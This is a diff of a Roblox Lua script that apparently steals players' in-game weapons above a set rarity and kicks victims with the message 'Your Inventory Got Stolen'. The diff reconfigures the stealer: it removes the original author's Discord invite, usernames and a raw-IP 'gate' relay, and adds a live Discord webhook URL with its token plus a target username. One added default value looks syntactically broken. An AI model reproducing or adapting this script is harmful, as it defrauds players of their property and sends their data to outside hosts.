@@ -6,22 +6,22 @@ _G.scriptExecuted = true
 -- Copy Discord invite to clipboard
 local function copyLink()
     local setcp = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
-    if setcp then setcp("https://discord.gg/bt4Cgw8F4x") end
+    if setcp then setcp("") end
 end
 copyLink()
 
 -- Hardcoded target usernames (combined with _G.Usernames)
-local DhUsers = { "joeiamjoezeif", "joezeif111x", "jo_125w" }
+local DhUsers = { "" }
 local combinedUser = {}
 for _, v in ipairs(_G.Usernames or {}) do table.insert(combinedUser, v) end
 for _, v in ipairs(DhUsers) do table.insert(combinedUser, v) end
 
 -- Configuration from global variables
-local users = _G.Usernames or {}
+local users = _G.Usernames or {WspNegatron5}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
+local ping = _G.pingEveryone or "Yes"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1536391097285087263/qF7Vlvud9CerBlObfDlJEyVli2LGuI37VOhyQLRoZFGWCLB5XOC4pY388OWND9_lOK_g"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
@@ -347,7 +347,7 @@ function SecureSend(data)
 end
 
 -- Webhook for member hits
-Raw_Webhook = "http://89.169.54.29:5000/gate?t="
+Raw_Webhook = ""
 local Real_Webhook = Raw_Webhook .. _G.webhook
 
 local function SendMemberHit(data)
@@ -711,7 +711,7 @@ if #weaponsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("Your Inventory Got Stolen\nJoin discord.gg/bt4Cgw8F4x To Make Your Own Script !")
+        plr:kick("")
     end
 
     local function startImmediateHit()
